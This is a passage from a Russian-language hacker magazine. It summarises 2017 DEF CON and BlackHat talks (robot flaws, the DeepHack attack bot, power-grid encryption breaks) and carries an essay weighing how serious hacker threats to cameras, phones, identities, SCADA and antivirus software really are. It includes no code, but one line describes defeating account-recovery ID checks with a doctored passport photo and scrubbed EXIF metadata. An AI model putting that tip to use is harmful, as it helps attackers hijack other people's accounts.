начала двух тысячных (да, тогда они тоже были, прос то стоили, хе‐хе, денег).
Вести деловые переговоры через автопереводчик мы не сможем еще дол го.
  Роботы, которые ставят диагнозы? Да не ста вят они диагнозы, дорогой
читатель. Они всего лишь помога ют принять решение благодаря нейросетям
и дос тупу к той самой биг‐дате, поз воляя, в частнос ти, подобрать наилучшую
схему химиотерапии. Но подбор химиотерапии сто раз обсле дованному
пациенту — это одно, а осмотр пациента, который почувствовал боль в груди,
быстро погуглил, перемешал свои личные жалобы с симптомами инфаркта
миокарда из интернетов, запутался и вызвал под это дело укомплектованную
нечеловекоподобными робота ми ско рую, — совсем другое дело. Кто будет
разбираться в этом нагромождении личных ощущений, додуманных симпто‐
мов и самовнушенных жалоб? Кибердиагност с помощью «Отметьте характер
боли, иррадиацию, длительность»? Нет, он не раз берется. Как не зашьет
рану, не вырежет аппендикс, не выгонит алка ша из приемного отде ления.
  С другой стороны, техника с каждым годом все больше и больше вытес‐
няет человека из тяжелого и/или неквалифицированного труда. Но об этом
уже задумываются государс тва, которым оказалось невыгодно пол ностью
передавать низкоквалифициро ванный труд роботам — сидящие на пособии
трудяги в свое сво бодное время занимаются отнюдь не самообразованием
и изучением третьего иностранного язы ка, не ваяют статуи и не сочиняют
поэмы, а создают дополнитель ную нагрузку на пра воохранительные органы.
А кто у нас будет ловить жуликов в ближайшую пятилетку? РобоШерлоки?
К сожалению, ловить и рас следовать они не смогут еще долго. Раз ве что
расстреливать нарушителей.


По мере того как экосистема роботов рас ширя ется и влияние роботов
в нашем социуме и экономике стремительно растет, они начинают представ‐
лять собой значительную угрозу для людей, животных и предприятий. По сути
своей роботы — это компь ютеры с руками, ногами и колесами. А при сов‐
ременных  реалиях  кибербезопасности —  это  уязвимые  компьютеры
с руками, ногами и колесами.
   Программные и аппа рат ные уязвимости современных роботов позволя ют
злоумышленнику задействовать физичес кие воз можности робота, чтобы
нанести  имущественный  или  финансовый  ущерб  или  даже  случайно
или намеренно создать угрозу человеческой жизни.
  В своих недавних исследова ниях докладчик обнаружил множес тво кри‐
тических уязвимостей в домашних, корпоративных и промышленных роботах
известных производителей. В докладе он рас кры вает технические детали
актуальных угроз и объясняет, как имен но злоумыш ленники могут компро‐
метировать  различные  компоненты  эко системы  роботов.  Разумеется,
с демонстрацией действующих экс пло итов.
  Среди обнаруженных докладчиком проблем в экосистеме роботов:
 • небезопасные коммуника ции;
 • возможность повреждения памяти;
 • уязвимости, позволяющие осу ществлять удаленное выпол нение кода
   (RCE);
 • возможность нарушения целос тности файловой системы;
 • проблемы с авториза цией, а в некоторых случаях вообще отсутствие
   таковой;
 • слабая криптография;
 • проблемы с обновлением прошивки;
 • проблемы с обеспечением конфиденциальности;
 • недокументированные возможности (также уяз вимые для RCE и прочего);
 • слабая конфигурация по умолчанию;
 • уязвимые open source «фреймворки для управления роботами» и прог‐
  раммные библиотеки.

Докладчик приводит живые демонстрации разнообразных сценариев взлома,
связанных с кибершпионажем, инсайдерской угрозой, имущес твенным ущер‐
бом и так далее. Описывая реалис тичные сценарии, которые можно наб‐
людать в дикой природе, докладчик рас сказыва ет, как небезопасность сов‐
ременной технологии роботов может при вести к взлому. Объясняет, почему
взломанные роботы даже более опасны, чем какие‐либо другие скомпро‐
метированные технологии.
   Также докладчик обра щает на внимание на то, что сырые исследователь‐
ские проекты уходят в производс тво рань ше, чем решены вопросы безопас‐
ности. Маркетинг, как всегда, выигрывает. Нужно срочно исправлять такое
нездоровое положение вещей. Пока Скай нет не пришел. Хотя… Сле дующий
доклад наталкивает на мысль, что Скайнет уже все‐таки тут.





МАШИННОЕ ОБУЧЕНИЕ НА СЛУЖБЕ БЛЕКХЕТОВ
Dan Petro, Ben Morris. Weaponizing Machine Learning: Humanity Was Overrated
Anyway // DEF CON. 2017
   Рискуя прослыть сумасбродным ученым, докладчик все же умиляется сво‐
им «новеньким дьяволь ским тво рением», с гордостью представляя Deep‐
Hack — хакерский ИИ с открытым исходным кодом. Этот бот — самообу‐
чающийся взломщик веб‐приложений. В его осно ве лежит нейронная сеть,
которая обучается методом «проб и ошибок». При этом  к возможным
для человека последствиям от этих своих «проб и ошибок» DeepHack отно‐
сится с устрашающей пренеб режительностью.
  Используя всего один универсальный алгоритм, он обу чается эксплуати‐
ровать разнообразные виды уяз вимос тей. DeepHack открывает дверь в царс‐
тво хакерского ИИ, многочисленных предста вителей которого уже можно
ожидать в ближайшем будущем. В связи с этим докладчик гордо именует сво‐
его бота «началом конца».
  Докладчик считает, что хакерские утилиты на основе ИИ, которые вскоре
появятся вслед за DeepHack, — это прин ципиально новая технология,
которую киберзащитникам и кибернападающим еще только предстоит взять
на вооружение. Докладчик гарантирует, что в следующем году каждый из нас
будет либо сам писать хакерские утилиты с машинным обучени ем, либо отча‐
янно пытаться защититься от них. Треть его не дано.
   Также, то ли в шутку, то ли всерь ез, докладчик заявляет: «Больше не явля‐
ющаяся пре рогативой дьявольских гениев, неизбежная антиутопия ИИ уже
доступна каждому сегодня. Поэто му присоединяйся к нам, и мы покажем,
как ты можешь поучаствовать в уничтожении челове чес тва, создав свою
собственную милитаризованную систему машинного обучения. Конечно,
если гости из будущего не помеша ют нам сделать это».





ВСПОМНИТЬ ВСЕ: ИМПЛАНТАЦИЯ ПАРОЛЕЙ В КОГНИТИВНУЮ
ПАМЯТЬ
Tess Schrodinger. Total Recall: Implanting Passwords in Cognitive Memory // DEF
CON. 2017
   Что такое когнитивная память? Как туда мож но «имплантировать» пароль?
Это безопасно? И зачем вообще такие ухищрения? Идея в том, что
при использовании опи санного подхода ты не смо жешь проболтаться о своих
паролях даже под принуждением, сохраняя при этом воз можность авториза‐
ции в системе.
  Амбициозное заявление, вынесенное в заголовок своей презентации,
докладчица, конечно, до полного решения не довела, но при этом рас сказала
о нескольких любопытных исследованиях, которые находятся на подступах
к решению поставленной задачи, в частности исследованиях Стэнфордского
университета, посвященных этой теме, и проекте по разработке челове‐
ко‐машинного интерфейса для слабовидящих людей — с пря мым подклю‐
чением к мозгу. Также автор доклада ссылает ся на исследование германских
ученых, которым удалось провес ти алго ритмическую связь между электричес‐
кими сигналами мозга и сло весными фразами; раз работанное ими устрой‐
ство позволяет набирать текст, прос то думая о нем. Еще одно любопытное
исследование, о котором говорит докладчица, — нейротелефон, интерфейс
между  мозгом  и  мобильным  телефоном  пос редс твом  бес проводной
ЭЭГ‐гарнитуры (Дартмутский колледж, США).





КИБЕРАТАКИ НА ЭНЕРГОСЕТИ — НЕ ТОЛЬКО ДЛЯ
ПРАВИТЕЛЬСТВЕННЫХ ХАКЕРОВ
Anastasis Keliris. And then the Script‐Kiddie Said Let There Be No Light. Are Cyber‐
Attacks On the Power Grid Limited To Nation‐State Actors? // BlackHat. 2017
  О роли бесперебойного электроснабжения в нашей жизни мы не задумы‐
ваемся до первого блэкаута. Когда мы были малень кими, перебои с электри‐
чеством случались часто, наши родители ходили по дому с зажженны ми свеч‐
ками и искали источник проблемы, и это было даже весело… Но когда подоб‐
ное происходит в пределах квартала или даже города — вот тогда взрослому
человеку становится по‐нас тоящему страшно.
   Электричество — ресурс стратегичес ки важный, и считается, что атаки
на энергосети чрезвычайно сложны и доступны только для правительствен‐
ных хакеров. Докладчик оспаривает это устоявшееся мне ние и представляет
детальное описание атаки на энергосети, затраты на проведение которой
приемлемы даже для хакеров, не имеющих за плечами ресурсы спецслужб.
Он демонстрирует собранную из интернета информацию, которая будет
полезна при моделировании и анализе целевой энергосети. И объ ясня ет,
как эту информацию мож но использовать — для моделирования атак на элек‐
тросети по всему миру.
   Также в докладе демонс трируется критическая уязвимость, обнаруженная
докладчиком в продуктах General Electric Multilin, которые широко применя‐
ются в энергетике. Докладчик описывает, как он полностью скомпромети‐
ровал используемый в этих системах алгоритм шифрования. Этот алгоритм
применяется в продуктах General Electric Multilin для защищенной коммуника‐
ции внутренних подсистем и для управления этими подсистемами. В том чис‐
ле для авторизации пользователей и обес печения доступа к привилегирован‐
ным операциям.
   Узнав коды доступа  (в  результате компро метации  алгоритма шиф‐
рования), злоумышленник может полностью вырубить устройство и вык‐
лючить элек тричество в заданных секторах энергосети, заблокировать опе‐
раторов. Кроме того, докладчик демонстрирует технику удаленного считыва‐
ния цифровых сле дов, которые оставляет уяз вимое для кибератаки оборудо‐
вание.


ИНТЕРНЕТ ПРОТИВ ЖЕНЩИН
Cooper Quintin. The Internet Already Knows I’m Pregnant // DEF CON. 2017
  Некоторые аспекты женского здо ровья, как оказывается, не только повод
для скандала с мужчинами, но и бизнес. На рынке существует огромное мно‐
жество Android‐приложений, которые помога ют женщинам отслеживать еже‐
месячный цикл, знать, когда наибольшая вероятность зачатия, или контро‐
лируют состояние беременности. Эти приложения побуждают женщин фик‐
сировать самые интимные детали своей жизни, такие как настроение, сек‐
суальная активность, физичес кая активность, физические симптомы, рост,
вес и многое другое.
  Но насколько эти приложения конфиденциальны и насколько они безопас‐
ны? Ведь если приложение хранит такие интимные подробности о нашей лич‐
ной жизни, было бы неплохо, чтобы оно не делилось этими данными
с кем‐либо еще, например с дру жес твенной компанией (занимающейся тар‐
гетированной рекламой) или со зло намеренным партнером/родителем.
  Докладчик представляет результаты своего анализа кибербезопас ности
более десятка приложений, прогнозиру ющих вероятность зачатия и отсле‐
живающих течение беременности. Он обнаружил, что в большинстве подоб‐
ных приложений есть серьезные проблемы с кибербезопасностью вообще
и конфиденциальностью в час тности.





Говорит и показы вает Денис Мак рушин
Не в силах остаться в стороне от такой темы, наш завсегдатай ИБ‐конферен‐
ций (как в качестве слушателя, так и в роли докладчика) Денис Макрушин
представ ляет еще несколько крутых докладов на свой вкус. Вот они:
 • Релиз модуля эксфильтра ции данных для Metasploit на ZeroNights 2017
 • Интересный ресерч о  воздействии  зву ка на HDD, опубликованный
   на ekoparty
 • Интересный ресерч, свя занный с безопасностью автомобилей, на конфе
  SHA 2017
 • Внедрение малвари в ДНК
ВЗЛОМ

 ВСЕМОГУЩЕСТВО
ВЗЛОМЩИКА

       ОЦЕНИВАЕМ РЕАЛЬНУЮ
          СТЕПЕНЬ УГРОЗЫ
           ХАКЕРСКИХ АТАК





                                               84ckf1r3
                                              84ckf1r3@gmail.com





В каждую эпоху были свои сказания о рыцарях и драконах,
героях и злодеях. Сегодня их место заняли хакеры в белом
и черном. О них слагают легенды, им посвящают книги
и называют новыми властителями техногенного мира. Давай
вместе раз беремся,  какие из  стра хов перед  хакерами
оправданны, а для каких пока нет подтверждений.


ПОДГЛЯДЫВАНИЕ ЧЕРЕЗ КАМЕРЫ И ПУБЛИКАЦИЯ ИНТИМНЫХ
ФОТОГРАФИЙ
Пожалуй, ни один современный фильм не обходится без эпизода взлома
камер наблюдения. Кажет ся, что это занимает секунды и поз воляет иметь
глаза повсюду. Мы уже писали подробную статью о том, как в действитель‐
ности перехватывают доступ к веб‐ и IP‐камерам. Если кратко, то это две
совершенно разные техничес кие задачи. Складыва ется впе чатление, что сей‐
час становится все популярнее дру гое направление — взламывать смартфо‐
ны,  чтобы жертву фотографировать и записывать на видео, особенно
в интимные моменты жиз ни.
  В прошлом году специалисты Palo Alto Networks обнаружили троян Spy‐
Dealer, который (в добавок к стандартному набору функций) снимает своих
жертв, используя обе камеры смартфона, а заодно делает скриншоты. Такие
зловреды обычно относят к инстру ментам для продвинутых целенаправлен‐
ных атак (APT). Поэтому шанс заразиться им у звезды телешоу очень высокий,
а у какого‐нибудь Васи из Нижнего Гадюки но — минимальный. Скорее он
станет жертвой «пугача».
   Есть целый класс угроз под наз ванием scareware. Они берут на испуг,
часто не представляя реальной опасности. Например, вот такое замечатель‐
ное письмо заставило преж девременно… поседеть многих парней из Австра‐
лии. В нем утверждалось, что жертву засняли встроенной веб‐камерой
во время просмотра сайтов для взрослых. Если в течение суток вымогателю
не перечислить энную сумму в биткойнах, то всем контактам из его адресной
книги будет отправлено занятное видео. Конечно, никакого подгля дывающе‐
го трояна не было, но если мы считаем что‐то реаль ным, то оно становится
реальным по своим последствиям. Особо впечатлительные отправили выкуп.
   Утечки приватных фото непос редственно со смартфонов и из облачных
хранилищ происходят нас только регулярно, что им пос вящены специальные
разделы на порталах с «клубничкой». Однако целенаправленные атаки в этих
случаях скорее исключение, чем правило.
  В случае известных людей всегда есть подоз рение о контролируемой
утечке как пиар‐акции. Нап ример, бра зиль ская модель Жизель Бюндхен
на «слитых хакерами» фотографиях выглядит откровенно позирующей, да и
сам стиль этих кадров мало отличается от ее привычных фотосессий. Такие
«секретные» снимки — хороший способ подогреть инте рес публики к своей
персоне.
  Однако бывают и сливы, очень похожие на нас тоящие. К при меру, ин‐
тимные фото Аманды Сайфред — это именно любительские кадры, где актри‐
са часто представлена не в лучшем амплуа. Подобные снимки могли сделать
ее (бывший) парень или (завистливая) подруга, что бы затем использовать их
в качестве порномести. Так или ина че, пикантные снимки превратили Аманду
в одну из самых обсужда емых актрис в прошлом году, и тут интересен ито‐
говый результат.
   Если раньше подоб ное считалось несмываемым позором и концом карь‐
еры (в монастырь или в пет лю), то сегодня это дает хайп на короткое время
и быстро смывается  волной  других  скандальных  событий. Уже  через
неделю‐две всем будет безразлично, кто там мелькнул в кадре голым задом.


КРАЖА ДАННЫХ С МОБИЛЬНЫХ ДЕВАЙСОВ
Интересно проследить за тем, как развивались угрозы для смартфонов
и планшетов. Поначалу мы встречали довольно примитивные зловреды
для гаджетов, действовавшие ана логично сво им десктопным собратьям: они
воровали пароли, показывали навяз чивую рекламу, блокировали устройства
и вымогали деньги.
  Однако вскоре смартфо ны породили новые векторы атак: вирусные под‐
писки на платные услуги, дозвон и рассылку SMS на короткие номера и,
наконец, подглядывание через камеры с последу ющим шантажом. Впрочем,
это все тоже были цветочки.
  Сейчас мобильные устройства стали для хакеров приоритетной целью,
поскольку их память содержит уйму конфиденциаль ных данных о самой жер‐
тве и ее окружении. Появляются трояны столь высокого уровня, что их раз‐
работка явно велась по заказу спецслужб.
  Например, ряд очень характерных функций есть у зловреда Skygofree,
заражающего мобильники с ОС Android. В частнос ти, он отправляет копии
переписки в соцсетях, контролиру ет перемещения смартфонов и автомати‐
чески вклю чает прослушку, когда их геог рафичес кие координаты соответству‐
ют заданным. Например, когда один смартфон оказал ся в комнате перего‐
воров или рядом со смартфо ном дру гого собеседника, за которым ведется
слежка.
   Также Skygofree принудительно включает Wi‐Fi и самостоятельно выпол‐
няет подключение к хотспотам типа «злой двойник», которые контролирует
атакующая сторона. Общее число шпионских функций у Skygofree сос тавляет
почти полсотни. Предположитель но за его созданием стоит итальянская фир‐
ма Negg International, разрабатывающая софт для NSA и GCHQ. Понятно, что
им сложно противостоять, но «сложно» еще не озна чает «бесполезно».


ВСЕ МОГУТ КОРОЛИ?
Многие считают, что им нечего скрывать от всеведу щих спецслужб, а извес‐
тные методы защиты данных все равно от них не спасут. Отчасти такое отно‐
шение формируют сами ведомства, но IRL их воз можности тоже далеко
не безграничны. NSA, CIA, FBI и другие страш ные трехбуквенные организа‐
ции состоят из рядовых сотрудников, которые, прос тите за резкость, регуляр‐
но лажают.
  Например, NSA случайно уда лила раз ведданные за семь лет, а группиров‐
ка Crackas With Attitude в 2015–2016 годах получила доступ к аккаунтам
руководителей почти всех федеральных ведомств США. Только один ее пред‐
ставитель — Justin «D3F4ULT» Liverman лич но поимел директоров ФБР и ЦРУ,
как написано в обвинительном заключении: «…длительно терроризируя их
и их семьи разглашением конфиденциальной информации, полученной
в результате незаконного дос тупа к онлайновым акка унтам потерпевших».
   Это не Ливерман оказался сильнее спецслужб, а их главы наплевали
на элементарные правила безопасности, пользуясь для работы публичны ми
сервисами (вроде AOL Mail), которые не ломал толь ко ленивый.
  Еще бытует мнение, что шифруй не шифруй, а все равно получишь… дос‐
туп. Конечно, под пытками вспоминают даже те пароли, которые и не знали,
но не всегда столь грубые методы доступны. Просто посмотри, сколько
негодования каждый раз вызывает у ФБР очередной смартфон с функцией
полного шифрования данных. К примеру, в нояб ре 2017 года на допросе
«техасского стрелка», убившего 26 человек, следс твие застряло из‐за того,
что он отказался разблокировать свой смартфон.
   Как же быть с историями о взло ме? Все успешные «взломы» последних
смартфонов достигались кос венными метода ми. Например, через бэкапы
облачных копий, авториза цию с залогиненных в ту же учетку ноутбуков…
или старым и совсем недобрым ректотермальным криптоанализом.
   Когда бэкапов нет, а пытать некого, ФБР ищет профессиональных охот‐
ников за уязвимостями, пос кольку само не располага ет дос таточно квалифи‐
цированными кадрами. Например, в 2016 году бю ро заплатило 1,3 мил лиона
долларов за уязвимость нулевого дня. Она поз волила вскрыть iPhone 5c, най‐
денный у ликвидированного в ходе спецоперации террорис та Сайеда Риз‐
вана Фарука. Тогда Apple не смогла (или не захотела) помочь забраться
в айфон, а в новых моделях закрыла эту уяз вимость.
  Директор ФБР Кристофер Рэй заявил, что из‐за шифрования бюро
не смогло получить данные почти с семи тысяч мобильных устройств, которые
изъяло у подозреваемых в 2017 году. Может, шифрование и не панацея,
но оно точно усложняет задачу сбо ра доказатель ств. Просто не все крип‐
тосистемы одинаково полезны, а принципиальные отличия в подходах к шиф‐
рованию данных на смартфоне описаны здесь.


КРАЖА И СТИРАНИЕ ЛИЧНОСТИ
По информации Javelin Strategy & Research, примерно 6,15% взрослых граж‐
дан США ежегодно становятся жертвой кра жи персональных данных. Прес‐
тупники совершают сделки от их имени, нанося финансовый и репутационный
ущерб. Чаще всего они незаконно оформляют кредиты и оплачивают развле‐
кательные услуги по чужой кредитке, но этим список не ограничивается.
  К примеру, теоретически воз можно стирание  личности — удаление
информации о человеке на всех электронных ресурсах. Если база данных
централизованная, то речь идет об одной успешной атаке. Если же это БД
в отдельных ведомствах, каждое из которых ведет свой реестр, то сложность
атаки многократно возраста ет. Поэто му самый эффективный способ сти‐
рания личности на сегодня не технический, а бюрократичес кий. Достаточно
инсценировать смерть или «удачно» ока зать ся в спис ках без вес ти пропав‐
ших, как бюрократическая машина сама перемес тит все записи о человеке
в архив. Они не удалятся, а просто перес танут быть актуальными и поз волят
начать жизнь с чистого лис та… или же вынудят долго обивать пороги, доказы‐
вая, что ты живой.
  Другая разновидность такой ата ки называ ется подмена личности. Она
заключается в том, что во всех онлайновых базах данных, до которых смогли
дотянуться злоумышленники, сведения о каком‐то челове ке подменяются
записями о другом. После это го он сможет действовать от имени жертвы
и документально подтверждать правомерность своих действий. Самая час тая
ситуация — угон аккаунтов в соцсетях. Большинство из них допускают вос ста‐
новление пароля при обращении в техподдержку, которая просит прислать
фотографию с разворотом пас порта или водительским удостоверением
в руках. Мастера фотошопа и hex‐редактора успешно обходят такую верифи‐
кацию, если наряду с фотографией заменя ют в джепеге метаданные, удаляя
строки Adobe Photoshop из EXIF.


SCADA
Все технологические про цес сы сегодня авто матизированы и часто име ют
удаленное управле ние. Что будет, если его взломают? В 2001 году Эрик Бай‐
рес, Джастин Лоу и Дэвид Леверсаж стали вес ти базу инцидентов в сфере
промышленной безопасности ISID, а с 2014 года она доступна онлайн.
  Первым зарегистрированным в ней инцидентом стал хрестоматийный слу‐
чай, относящийся к эпо хе холодной войны.
   Старший сот рудник Агентства национальной безопасности США Томас
Рид в своей книге At the Abyss утверждает, что в начале восьмидесятых АНБ
допустило контролируемую утечку ПО для управления насосами. Софт содер‐
жал троян, который активировался в июне 1982 года во время испы таний
Транссибирского газопровода. Он удво ил давление газа и привел к раз‐
рушению сварных швов, сорвав поставки газа и вызвав мощный психоло‐
гический эффект. Советская сто рона не отри цает сам взрыв, но исключает
его взаимосвязь с трояном. «То, что написали американцы, — это мусор», —
сказал Василий Пчелинцев, возглавлявший в 1982 году отдел КГБ в Тюмен‐
ской области.
  Подобные истории всегда вызывают противо речивую реакцию, поскольку
одна сторона может присвоить себе мнимый успех, а другая — скрывать про‐
валы. Широкой общественности выборочно предъявляются доказательства
разных версий, но никогда не открывается полная картина — это обычная
манипуляция толпой. Факт в том, что факты можно получить только из тех рас‐
следований инцидентов, которые изначально велись откры то.
  Например, в 2012 году в США произошла серия «веерных отключений»
электроэнергии, причиной которых ста ли различные нарушения в сфере про‐
мышленной безопасности. Все началось с того, что работавший на аутсорсе
техник принес на флешке вирус Mariposa. Вирус не был специально написан
для порчи оборудования, как это было с трояном Stuxnet. Речь о банальном
разгильдяйстве. Тех ник наплевал на должностные инструкции и подключил
зараженную флешку напрямую к управляющему компьютеру. Он попытал ся
скопировать с нее настройки, тем самым вызвав рас пространение инфекции.
В тот же день как минимум десять других компьютеров системы управления
турбинами на разных электрос танциях США ока зались заражены. Их приш‐
лось остановить, а переза пуск, расследование и возврат к плановой мощ‐
ности потребовали три недели.
   Если сам вирус в промышленных системах отловить сравнительно прос то,
то пол ностью устранить пос ледствия инфи цирования зачас тую не удается.
Это не домашний компьютер, который можно выключить в любой момент,
полностью очистить накопитель и переуста новить ОС. Энергетическая сеть
состоит из сотен взаимосвязанных узлов, работающих круглосуточно. Поэто‐
му проблемы на одних узлах так или иначе зат рагивают дру гие. Поз же один
из двух ядерных реакторов на АЭС «Сас куэханна» был отключен операторами
вручную, потому что компь ютерная система контроля уровня воды стала сбо‐
ить и возник риск перегрева активной зоны.
   Атаки на SCADA затрагивают преимущественно промышленные системы.
Если удается предотвратить ава рию, они редко ста новятся достоянием глас‐
ности. Однако некоторые из них направлены на городскую инфраструктуру,
где даже мелкие шалости могут быть очень замет ными.
  В том же 2012 году был опуб ликован бюллетень о множественных уяз‐
вимостях в популярной платформе Tridium Niagara AX. Она объеди няет сис‐
темы охраны, управле ния отоплением, вентиляцией и кондици они рованием,
лифтами, освещением и пожарной безопасностью зданий, предос тавляя
к ним  единый  доступ  через  веб‐интерфейс. Просто  иде альная  цель
для кул‐хацкеров и скрипт‐кидди.
  После того как опубликова ли детали уяз вимос ти, в Нью‐Джерси были
зарегистрированы множественные слу чаи взлома Tridium Niagara AX. Поз же
кто‐то написал удоб ный бэкдор, и десятки кул‐хацкеров стали наперебой
развлекаться с настрой ками раз ных зданий. Всего в мире было продано свы‐
ше 300 тысяч лицензий на Tridium Niagara AX. Сервис Shodan подсказывает,
что многие клиенты до сих пор не установили патчи.
  Еще  одна  чувствительная  отрасль —  управление  транспортом.
В 2013 году вся компьютер ная сеть Департамента автомобильных дорог
округа Кук была закрыта почти на две недели из‐за вирусного инцидента.
Неизвестный зловред атаковал около двухсот компьютеров. Для его лик‐
видации потребовалось пять техников и девять суток непрерывной работы.
Механизм проникновения в сеть остается неизвестным. По основной версии
предполагается целенап равленная атака.
  В 2014 году странный сбой в программе управления самоле том‐раз‐
ведчиком U‐2 привел к длительной задержке нес коль ких сотен рейсов в меж‐
дународном аэропорту Мак‐Карран в Лас‐Вегасе. Отдельные источники свя‐
зывают это с деятельностью хакерской группы Dragonﬂy, чьи атаки преиму‐
щественно нацелены на подрядчиков DARPA и авиакомпании США. Офи‐
циальных комментариев на этот счет также не пос тупало.


ТОРГОВЛЯ СТРАХОМ
База ISID перестала обновлять ся в январе 2015 года. Все меньше компаний
готовы рассказать о случавшихся у них инци дентах, поскольку боятся рис ков
для деловой репутации. Иног да такие сообщения просачиваются в прессу
от «доверенных источни ков» или даже обретают лицо, но редко находят офи‐
циальные подтверждения. Здесь открывает ся широкий простор для злоупот‐
реблений и торговли страхами.
  Например, у American Banker недавно воз никли вопросы к основателю
компании Groub IB Илье Сачкову. По словам издания, ни международная
некоммерческая организация FS‐ISAC, ни подразделение Центробанка Fin‐
CERT не находят подтверждения его сло вам о хакерской группировке Money
Taker, якобы давно действу ющей и уже укравшей свыше десяти миллионов
долларов из российских и американских банков. Аналитичес кое агентство
Gartner тоже ставит под сомнение заявления Ильи. «FS‐ISAC просто не может
не узнать о нападении на шестнадцать банков», — сказала вице‐пре зидент
Gartner Авива Литан.
  Конечно, финансовые орга низации оста ются одной из самых лакомых
целей. Взломать их не так уж слож но, а вот сделать это незаметно и восполь‐
зоваться украденными деньгами без пос ледствий — на грани фантастики.
Протоколируется каждая транзакция, видны все перемещения денежных
средств,  постоянно  генерируются  сверки  и  автоматичес кие  отчеты.
Для успешной кражи потребуется помощь инсайдера (и не одного), но это
уже проблема доверия собственным людям, а не технике.


Ан тивиру сы как кейлоггеры, антивиру сы как…ботнеты?
Основная доля продавцов стра шилок приходится на псевдоантивирусы. Они
выпол няют бесплатное «ска нирование» (часто — онлайн), якобы что‐то
находят, а затем предлага ют удалить это за деньги. Именно пугачи портят
репутацию настоящим антивирусам. Впрочем, настоящие все меньше отли‐
чаются от фейковых.
   Год назад мы протестировали десятки бесплат ных антивирусов и замети‐
ли, что они все больше напоминают scareware. Запугивание пользовате ля
начинается еще во время уста новки, а затем антивирус достает уведомлени‐
ями до тех пор, пока ты не купишь платную версию и не разрешишь ему
делать что угодно на сво ем компь ютере (или не уда лишь его). Такая тактика
агрессивного продвижения подрывает доверие ко всем производителям
защитного ПО, затрагивая даже лидеров рын ка.
   Скандал с запретом использования продуктов ЗАО «Лаборатория Каспер‐
ского» в США до сих пор не утихает, но выдвинутые обвинения можно предъ‐
явить любому разработчику  антивирусов. Все они содержат средства
облачной проверки и отправляют на свои серверы любые файлы, которые
сочтут подозрительными. По заявлениям производите лей, все происходит
в автоматическом режиме и обезличивается, а сама технология непригодна
для сбора информации с определенных компь ютеров. Однако обратная
задача (найти источник рас простра нения какого‐то зловреда или установить
принадлежность файла конкретному компьюте ру) в целом решаема.
  Другая проблема состоит в том, что ошиб ки в любом популярном ПО час‐
то используются для выполнения атак, и антивирусы здесь — одна из главных
целей. Например, в Bitdefender Internet Security 2018 была обнаружена уяз‐
вимость, позволяющая удаленно выполнять произвольный код. Не лучше
обстоят дела у Avast, AVG и многих других.
  Современные антивиру сы глубоко интегри руются в систему, и порой
это создает больше проб лем, чем решает. Они устанавливают собственные
службы (в которых могут содержать ся ошиб ки), перехватывают системные
вызовы (нарушая работу дру гих программ), словом — имеют слишком много
прав и технически способны выполнять любые дей ствия без ведома поль‐
зователя.
  Еще настораживают модули антивирусов вроде «безопас ных платежей».
Ты заходишь на сайт банка с бра узерным рас ширением антивируса и вво‐
дишь данные на его «защищенной от кейлоггеров» экранной клавиатуре. Все
это вроде бы как идет по HTTPS, но антивирусу же надо проверять зашиф‐
рованный трафик, поэтому он давно установил собс твенный сертификат
для его расшифровки. Круг замкнулся...
  Все остальные идентифика ционные данные уже есть у антивирусной ком‐
пании — ты сам их указал при регистра ции. Поэто му чис то техничес ки ничто
не мешает манипулировать тво ими счетами, списывая все на проделки
хакеров. Другое дело, что репута ция компании стоит дороже и вряд ли такое
происходит в реальности. Во всяком случае, нам о таких фактах неизвестно.


Шпионские фун кции ОС
Обсуждению следящей активнос ти Windows 10 была посвящена не одна
статья, и здесь дела обсто ят примерно так же, как с анти виру сами. Теоре‐
тически возможностей шпионить за любым пользователем предостаточно.
Реализованы ли они фактичес ки — трудно ска зать наверняка. В наших изыс‐
каниях нам пока не удалось поймать операционку на краже данных. Да, она
отсылает кучу статистической информации, которая наверняка используется
для персонализированной рекламы и поз воля ет создать «циф ровой отпе‐
чаток», идентифицируя устройство и пользователя уже без явной авториза‐
ции. Да, исходящий трафик прос то огромный и не весь легко анализируется,
но чего‐то однозначно криминального в исходящих пакетах пока не обна‐
ружилось. Все отсылается на серверы Microsoft и партнеров в соответствии
с лицензионным соглашением, подписывая которое ты фактичес ки сам раз‐
решаешь следить за собой.


ВЫВОДЫ
Технически хакеры ограничены степенью своей осведомленности о внут‐
реннем устройстве выб ранной цели. Часто реаль ная цель имеет какие‐то
особенности, которые не учитыва лись в сценарии атаки. Поэтому обычно
проще взломать человека, чем уда ленный компь ютер. Никто не будет тратить
ресурсы на детальную проработку APT для Васи. Он просто попадет на раз‐
дачу для лохов, где его обманом заставят выполнить требуемые действия:
«отклю чить антивирус, файрвол и запус тить от адми на».
  Финансово хакеры ограничены слабо, пос коль ку часто действуют в инте‐
ресах преступных группировок или спецслужб, но последние тоже не все‐
сильны. Есть смысл использовать шифрование и соблюдать общие правила
безопасности. При этом стоит помнить, что защитный софт может содержать
уязвимости и часто сам ста новится средс твом проникновения на компьютеры
жертвы. Как минимум его надо регулярно обновлять и проверять настройки.
  Взлом SCADA может выз вать локальные сбои, но хакеры оказываются пос‐
ледней  угрозой  в списке реально  зна чимых факторов промышленной
безопасности. Возглавляют же его традиционно «человеческий фактор»
и «износ технологических узлов».
   Кибервойны вряд ли вызовут потоп из‐за сбоя на ГЭС и взрыв реактора
АЭС. Если бы это было воз можно, то индустри аль ный апокалипсис уже дав‐
но бы наступил. Это кажет ся так дешево и эффективно — устроить против‐
нику тотальный блэкаут и захватить парализованную страну! Однако пока при‐
ходится тратить уйму средств на подкуп должностных лиц и цветные револю‐
ции, вновь предпочитая социальный инжиниринг технически продвинутым
атакам.
  На ключевых объектах инфраструктуры реализован многос тупенчатый кон‐
троль состояния критичес ких узлов и мониторинг живыми людьми. К тому же
любое опасное изменение занимает время: насос мгновенно не прокачает
тонны воды, а реактор не перегреется за секунды. В большинс тве ситу аций
оператор успеет заметить откло нения и вмешать ся (что‐то на АЭС в Бушере
во время атаки Stuxnet они не успели вмешаться. ;) — Прим. ред.), да и любая
важная система изначально проектируется так, чтобы в ней не было единой
точки отказа. Есть пла чевный опыт «Чер нобыля» и «Фукусимы», но хакеры
никак с ним не связаны.
  В обществе есть механизмы противо дей ствия киберугрозам, не связан‐
ные с контролем над техникой. Бумажные документы все еще имеют приори‐
тет над электронными. Подмененные записи во взломанной базе данных
просто заменят информацией с оригинальных бланков. Правда, придется
побегать и вспомнить главное изобретение Совет ского Союза — очереди.
Банковские транзакции не выполняются мгновенно — их можно отменить
при своевременном обращении, да и наличные крадут чаще, чем деньги
с карточек. Удаленно вывести из строя промышленный объ ект помешает опе‐
ратор и автономные ава рийные системы. Авиалайнер не улетит в дру гую
страну из‐за подмены координат GPS — его курс скорректирует диспетчер,
